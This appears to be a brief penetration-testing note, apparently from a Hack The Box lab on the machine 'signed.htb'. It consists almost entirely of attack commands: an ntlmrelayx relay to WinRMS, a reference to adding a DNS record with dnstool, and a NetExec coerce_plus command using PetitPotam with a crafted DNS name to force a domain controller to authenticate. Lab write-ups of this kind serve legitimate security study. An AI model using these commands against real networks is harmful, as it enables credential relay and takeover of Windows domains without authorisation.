

```python

ntlmrelayx -t winrms://<attacking host> -smb2support
```

smb to hit dns record added using [[krbrelayx#dnstools.py|dnstool]]

```bash
nxc smb dc01.signed.htb -u <username> -p <password> -M coerce_plus -o L=dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA M=Petitpotam
```